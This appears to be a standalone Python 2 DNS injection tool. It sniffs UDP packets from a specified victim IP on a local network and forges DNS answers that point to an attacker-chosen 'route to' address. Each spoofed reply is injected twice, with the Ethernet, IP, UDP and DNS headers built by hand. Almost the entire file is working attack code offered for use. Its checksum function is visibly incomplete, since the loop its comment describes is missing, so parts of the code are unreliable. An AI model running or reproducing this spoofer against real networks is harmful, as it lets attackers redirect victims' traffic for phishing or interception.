import argparse
import struct

from PacketInjector import PacketInjector
from PacketSniffer import PacketSniffer
import binascii


def checksum(s):


    # loop taking 2 characters at a time


    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)

    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s


def dns_injection(victim_ip, routto_ip, packet_snf, packet_inj):
    victim_ip_parts = victim_ip.split('.')
    victim_ip = ''
    for victim_ip_part in victim_ip_parts:
        hex_part = hex(int(victim_ip_part)).split('x')[1]
        if len(hex_part) == 1:
            hex_part = '0' + hex_part

        victim_ip += hex_part

    routto_ip_parts = routto_ip.split('.')
    routto_ip = ''
    for routto_ip_part in routto_ip_parts:
        hex_part = hex(int(routto_ip_part)).split('x')[1]
        if len(hex_part) == 1:
            hex_part = '0' + hex_part

        routto_ip += hex_part


    while True:
        packet_snf.get_tcp_package()

        new_resp_packet = ''
        # udp packet
        if packet_snf.tcp_packet_hex[46:48] == '11':

            query_ip = packet_snf.tcp_packet_hex[52:60]
            router_ip = packet_snf.tcp_packet_hex[60:68]
            src_port = packet_snf.tcp_packet_hex[68:72]
            dest_port = packet_snf.tcp_packet_hex[72:76]

            if query_ip == victim_ip:
                query_mac = packet_snf.tcp_packet_hex[0:12]
                dest_mac = packet_snf.tcp_packet_hex[12:24]

                new_resp_packet += dest_mac
                new_resp_packet += query_mac
                new_resp_packet += packet_snf.tcp_packet_hex[24:28]

                ## IP protocol begins
                ## total length
                dec_len = (len(packet_snf.tcp_packet_hex) - 28) / 2 + 16
                hex_len = hex(dec_len).split('x')[1]
                if len(hex_len) == 2:
                    hex_len = '00' + hex_len
                elif len(hex_len) == 3:
                    hex_len = '0' + hex_len
                elif len(hex_len) == 1:
                    hex_len = '000' + hex_len
                ##

                int_hex_sr1 = int('4540', 16)
                int_hex_sr2 = int(hex_len, 16)
                int_hex_sr3 = int('0000', 16)
                int_hex_sr4 = int('4000', 16)
                int_hex_sr5 = int('3b11', 16)
                int_hex_sr6 = int(router_ip, 16)
                int_hex_sr7 = int(query_ip, 16)

                int_hex_all = int_hex_sr1 + int_hex_sr2 + int_hex_sr3 + int_hex_sr4 + int_hex_sr5 + int_hex_sr6 + int_hex_sr7

                checksum_str = hex(checksum(int_hex_all))[2:6]

                new_resp_packet += '4540'
                new_resp_packet += hex_len
                new_resp_packet += '0000'
                new_resp_packet += '4000'
                new_resp_packet += '3b'
                new_resp_packet += '11'
                new_resp_packet += checksum_str  # ip protocol check sum

                new_resp_packet += router_ip
                new_resp_packet += query_ip
                #########

                ## user datagram protocol begins
                new_resp_packet += dest_port
                new_resp_packet += src_port

                dec_len = dec_len - 20
                hex_len = '00' + hex(dec_len).split('x')[1]
                hex_len = hex(dec_len).split('x')[1]
                if len(hex_len) == 2:
                    hex_len = '00' + hex_len
                elif len(hex_len) == 3:
                    hex_len = '0' + hex_len
                elif len(hex_len) == 1:
                    hex_len = '000' + hex_len

                new_resp_packet += hex_len

                new_resp_packet += '0000'  # user datagram check sum

                ## domain name system part

                # trasaction ID
                new_resp_packet += packet_snf.tcp_packet_hex[84:88]
                new_resp_packet += '8180'
                new_resp_packet += '0001'
                new_resp_packet += '0001'
                new_resp_packet += '0000'
                new_resp_packet += '0000'

                new_resp_packet += packet_snf.tcp_packet_hex[108:len(packet_snf.tcp_packet_hex)]

                ##answer part
                new_resp_packet += 'c00c00010001000000090004'
                new_resp_packet += routto_ip


                for i in range(2):
                    try:
                        packet_inj.send_raw_hex(new_resp_packet)
                    except TypeError:
                        pass

                print 'packet send'


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('-i', nargs=1)
    ap.add_argument('-v', nargs=1)
    ap.add_argument('-r', nargs=1)

    opts = ap.parse_args()
    interface = opts.i[0]
    victim_ip = opts.v[0]
    routto_ip = opts.r[0]

    packet_snf = PacketSniffer(interface)
    packet_inj = PacketInjector(interface)
    dns_injection(victim_ip, routto_ip, packet_snf, packet_inj)